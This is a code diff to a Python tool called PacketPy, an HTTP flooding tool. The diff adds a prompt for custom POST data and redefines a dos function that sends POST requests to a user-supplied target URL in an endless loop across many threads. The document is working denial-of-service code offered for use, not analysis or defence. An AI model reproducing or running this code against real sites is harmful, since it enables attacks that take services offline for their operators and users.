@@ -23,10 +23,7 @@ print("PacketPy " + str(version))
 print("--------")
 print("")
 input("Press ENTER to continue ")
-print("")
-def dos(target):
-    while True:
-            res = requests.post(url, data={'requesting': '666666',})        
+print("")       
 threads = 20
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
@@ -40,6 +37,12 @@ except ValueError:
 if threads == 0:
     print("Threads must be at least 1. Setting to 1.")
     threads = 1
+postdata = input("HTTP Post data [abcdefABCDEF]: ")
+if postdata == '':
+    postdata = 'abcdefABCDEF'
+def dos(target):
+    while True:
+            res = requests.post(url, data={'requesting': str(postdata),}) 
 clearterminal()
 print("-----------------------------------------")
 print("")
@@ -47,7 +50,7 @@ print(" -=- HTTP payload in progress.. -=-")
 print("")
 print("")
 print("- Target URL: " + str(url)+ " -")
-print("- HTTP Payload size: Random")
+print("- HTTP Payload: " + str(postdata))
 print("- OS: " + str(os.name) + " -")
 print("- PacketPy version: " + str(version) + " -")
 print("")
